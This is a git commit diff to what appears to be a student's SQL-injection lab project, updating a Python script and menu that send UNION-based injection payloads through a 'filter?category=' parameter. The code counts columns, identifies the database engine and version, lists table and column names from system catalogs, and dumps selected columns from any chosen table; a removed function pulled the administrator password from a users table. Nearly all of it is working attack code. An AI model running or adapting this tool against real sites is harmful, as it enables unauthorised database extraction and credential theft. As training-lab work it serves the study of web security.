dc1c7131f8298a260bf95658beeb552fb6fa6a39
Marco Untiveros <marco.untiveros@unmsm.edu.pe>
2022-10-21 05:01:21 +0000

    Mousketool in lab06

--- sql-injection/lab-06/menu.py
+++ sql-injection/lab-06/menu.py
@@ -1,5 +1,5 @@
-import requests
 import sys
+import requests
 from bs4 import BeautifulSoup
 import re
 
@@ -8,32 +8,37 @@ list_databases={
             'dbVersTable':'',
             'dbConcat':' ',
             'dbTables':'FROM information_schema.tables',
-            'dbColumns':'FROM information_schema.columns'},
+            'dbColumns':'FROM information_schema.columns',
+            'dbSchema':'table_schema'},
    'PostgreSQL':{'dbVersColumn':'version()',
             'dbVersTable':'',
             'dbConcat':'||',
             'dbTables':'FROM information_schema.tables',
-            'dbColumns':'FROM information_schema.columns'},
+            'dbColumns':'FROM information_schema.columns',
+            'dbSchema':'table_schema'},
    'Oracle':{'dbVersColumn':'banner',
             'dbVersTable':'FROM v$version',
             'dbConcat':'||',
             'dbTables':'FROM all_tables',
-            'dbColumns':'FROM all_tab_columns'},
+            'dbColumns':'FROM all_tab_columns',
+            'dbSchema':'owner'},
    'Microsoft':{'dbVersColumn':'@@version',
             'dbVersTable':'',
             'dbConcat':'+',
             'dbTables':'FROM information_schema.tables',
-            'dbColumns':'FROM information_schema.columns'}
+            'dbColumns':'FROM information_schema.columns',
+            'dbSchema':'table_schema'}
 }
 
 listTables = []
 listColumns = []
-vTableId =-1
+V_TABLE =-1
+V_COLUMNS = []
 
 menu_options = {
     1: 'List of Tables',
     2: 'List of Columns',
-    3: 'Option 3',
+    3: 'Table Info',
     4: 'Exit',
 }
 
@@ -46,47 +51,74 @@ def option1(url,num_col,string_column,sqlDB):
     listTables.clear()
     path = "filter?category="
     payload_list = ['null'] * num_col
-    payload_list[string_column-1] = "table_name"
-    sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[sqlDB]['dbTables']+" -- -"
+    payload_list[string_column-1] = list_databases[sqlDB]['dbSchema']+"||'.'||table_name" 
+    sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[sqlDB]['dbTables']+" order by "+ str(string_column) +" -- -"
     print(url + path + sql_payload)
-    r = requests.get(url + path + sql_payload, verify=False)
+    r = requests.get(url + path + sql_payload, timeout=2,verify=False)
     soup = BeautifulSoup(r.text, 'html.parser')
-    print(soup)
-    database_version = soup.findAll("td")
+    #print(soup)
+    db_tables = soup.findAll("th")
+    if len(db_tables)==0:
+        db_tables = soup.findAll("td")
     i=1
-    for li in database_version:
+    for li in db_tables:
         listTables.append(li.text)
         print(i,li.text)
         i=i+1
-        
+    
     option = int(input('Select a Table: '))
-    print('Table Selected: '+listTables[option-1])
+    print('[+] Table Selected: '+listTables[option-1])
+    return listTables[option-1]
 
-def option2(url,num_col,string_column,sqlDB):
+def option2(url,num_col,string_column,sqlDB,table_name):
     listColumns.clear()
     path = "filter?category="
     payload_list = ['null'] * num_col
-    payload_list[string_column-1] = "table_name"
-    sql_payload = "' union select " + ','.join(payload_list) + " "+list_databases[sqlDB]['dbTables']+" -- -"
-    #print(url + path + sql_payload)
-    r = requests.get(url + path + sql_payload, verify=False)
+    payload_list[string_column-1] = "column_name"
+    sql_payload = "' union select " + ','.join(payload_list) +\
+        " "+list_databases[sqlDB]['dbColumns']+ \
+        " where table_name = '"+ table_name.split('.')[1] +"' order by "+ str(string_column) +" -- -"
+    print(url + path + sql_payload)
+    r = requests.get(url + path + sql_payload, timeout=2, verify=False)
     soup = BeautifulSoup(r.text, 'html.parser')
     #print(soup)
-    database_version = soup.findAll("tr")
+    db_tables = soup.findAll("th")
+    if len(db_tables)==0:
+        db_tables = soup.findAll("td")
     i=1
-    for li in database_version:
+    for li in db_tables:
         listColumns.append(li.text)
         print(i,li.text)
         i=i+1
         
-    option = int(input('Select a Table: '))
-    print('Table Selected: '+listColumns[option-1])
+    option = str(input('Select Columns (coma): '))
+    sublist = list(map(int, option.split(',')))
+    print(sublist)
+    mylist = list( listColumns[i-1] for i in sublist )
+    print(mylist)
+    return mylist
 
-def option3():
-     print('Handle option \'Option 3\'')
+def option3(url,num_col,string_column,sqlDB,table_name,columns):
+    path = "filter?category="
+    payload_list = ['null'] * num_col
+    payload_list[string_column-1] = "||'~'||".join(columns)
+    sql_payload = "' union select " + ','.join(payload_list) +\
+        " FROM "+table_name+ \
+        " order by "+ str(string_column) +" -- -"
+    print(url + path + sql_payload)
+    r = requests.get(url + path + sql_payload, timeout=2, verify=False)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    #print(soup)
+    db_tables = soup.findAll("th")
+    if len(db_tables)==0:
+        db_tables = soup.findAll("td")
+    i=1
+    for li in db_tables:
+        listColumns.append(li.text)
+        print(i,li.text)
+        i=i+1
 
 def menuSQLi(url,num_col,string_column,sqlDb):
-    
     while(True):
         print_menu()
         option = ''
@@ -97,11 +129,13 @@ def menuSQLi(url,num_col,string_column,sqlDb):
         #Check what choice was entered and act accordingly
         if option == 1:
             print('La BD ',sqlDb)
-            option1(url,num_col,string_column,sqlDb)
+            global V_TABLE
+            V_TABLE = option1(url,num_col,string_column,sqlDb)
         elif option == 2:
-            option2()
+            global V_COLUMNS
+            V_COLUMNS=option2(url,num_col,string_column,sqlDb,V_TABLE)
         elif option == 3:
-            option3()
+            option3(url,num_col,string_column,sqlDb,V_TABLE,V_COLUMNS)
         elif option == 4:
             print('Thanks message before exiting')
             exit()
--- sql-injection/lab-06/sqli-lab-06.py
+++ sql-injection/lab-06/sqli-lab-06.py
@@ -1,13 +1,13 @@
-from cgitb import text
-import requests
 import sys
+import re
+import requests
+from requests.exceptions import HTTPError,MissingSchema
 import urllib3
 from bs4 import BeautifulSoup
-import re
 import menu
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-global dbDetected
+DB_DETECTED=""
 list_databases=[("MySQL","@@version",""," "),
                     ("PostgreSQL","version()","","||"),
                     ("Oracle","banner","FROM v$version","||"),
@@ -16,28 +16,34 @@ list_databases=[("MySQL","@@version",""," "),
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
 def exploit_sqli_column_number(url):
+    """Obtains the number of columns"""
     path = "filter?category=Gifts"
-    for i in range(1,20):  
-        sql_payload = "' order by %s -- -" %i
-        r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
-        #print(url + path + sql_payload)
-        res = r.text
-        #print(res)
-        if "Internal Server Error" in res:
+    for i in range(1,20):
+        sql_payload = F"' order by {i} -- -"
+        try:
+            resp = requests.get(url + path + sql_payload, timeout=2, verify=False)#, proxies=proxies)
+            resp.raise_for_status()
+        except (HTTPError, MissingSchema) as err:
+            if resp.status_code == 502:
+                print(f'[-] {err}')
+                return False
+
+        if "Internal Server Error" in resp.text:
             return i - 1
         i = i + 1
     return False
 
 def exploit_sqli_string_field(url, num_col):
+    """Obtains the first string colum"""
     path = "filter?category=Gifts"
     
     for i in range(1, num_col+1):
         payload_list = ['null'] * num_col
         payload_list[i-1] = "'test'"
-        fromdual=''# FROM dual '
+        fromdual=' FROM dual '
         sql_payload = "' union select " + ','.join(payload_list) + fromdual + "-- -"
         
-        result = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
+        result = requests.get(url + path + sql_payload, timeout=2, verify=False)#, proxies=proxies)
         #print(url + path + sql_payload)
         soup = BeautifulSoup(result.content, 'html.parser')
         res = str(soup.find_all("div", {'class':'container is-page'}))
@@ -47,45 +53,25 @@ def exploit_sqli_string_field(url, num_col):
     return False
 
 def exploit_sqli_database_version(url,num_col,string_column):
+    """Obtains the Database Version"""
     path = "filter?category="
     for i in range(0, len(list_databases)-1):
         payload_list = ['null'] * num_col
         payload_list[string_column-1] = list_databases[i][1]
         sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[i][2] +" -- -"
-        strSeparator=list_databases[i][0]
+        db_detected=list_databases[i][0]
         
-        r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
+        r = requests.get(url + path + sql_payload, timeout=2, verify=False)#, proxies=proxies)
         #print(url + path + sql_payload)
         soup = BeautifulSoup(r.text, 'html.parser')
         #print(soup)
-        if not "Internal Server Error" in str(soup):
+        if "Internal Server Error" not in str(soup):
             dbversion = soup.findAll("th")
-            dbDetected = str(list_databases[i][0])
-            print(dbDetected)
             print("[+] "+list_databases[i][0]+"-> The database version is ")
             for li in dbversion:
                 print(li.text)
             
-            return strSeparator 
-    return False
-
-
-def exploit_sqli_users_table(url,num_col,concatenator):
-    username = 'administrator'
-    path = 'filter?category=Pets'
-    
-    for i in range(1, num_col+1):
-        payload_list = ['null'] * num_col
-        payload_list[i-1] = "username "+concatenator+ "'*'" +concatenator+" password"
-        sql_payload = "' union select " + ','.join(payload_list) + " FROM users-- -"
-
-        r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        if username in str(soup):
-            print("[+] Found the administrator password...")
-            admin_password = soup.find(text=re.compile('.*administrator.*')).split("*")[1]
-            print("[+] The administrator password is '%s'." % admin_password)
-            return True
+            return db_detected
     return False
 
 if __name__ == "__main__":
@@ -111,8 +97,6 @@ if __name__ == "__main__":
             if concatenator is False:
                 print("[-] Unable to dump the database version.")
             else:
-                #if not exploit_sqli_users_table(url,num_col,concatenator):
-                #    print("[-] Did not find an administrator password.")
                 print('main.DB:',concatenator)
                 menu.menuSQLi(url,num_col,string_column,concatenator)
         else:
